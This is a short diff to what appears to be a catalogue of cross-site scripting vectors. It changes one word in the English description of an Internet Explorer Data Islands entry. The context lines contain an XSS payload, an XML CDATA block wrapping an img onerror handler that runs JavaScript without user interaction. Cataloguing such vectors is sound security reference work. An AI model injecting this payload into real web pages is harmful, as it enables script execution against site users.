@@ -1691,7 +1691,7 @@ var items =
             'raw'           : '<?xml version="1.0"?><x><payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload></x>'
         },        
         'description': {
-            'en' : 'Internet Explorer supports Data Islands and an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
+            'en' : 'Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
             'jp' : '',
             'ru' : '',
             'de' : ''
